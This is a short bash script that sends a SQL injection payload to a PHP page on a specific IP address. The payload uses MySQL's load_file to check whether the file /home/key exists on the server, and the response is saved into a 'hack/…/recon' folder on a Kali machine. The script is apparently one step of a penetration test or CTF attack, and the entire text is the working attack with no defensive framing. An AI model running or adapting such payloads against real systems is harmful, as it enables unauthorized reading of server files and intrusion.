#!/bin/bash
# Check if /home/key file exists and is readable
curl -s "http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%09length(load_file('/home/key'))>0%23" > /home/kali/桌面/hack/8.140.206.93/recon/file-check.html
echo "File check: $(wc -c < /home/kali/桌面/hack/8.140.206.93/recon/file-check.html) bytes"
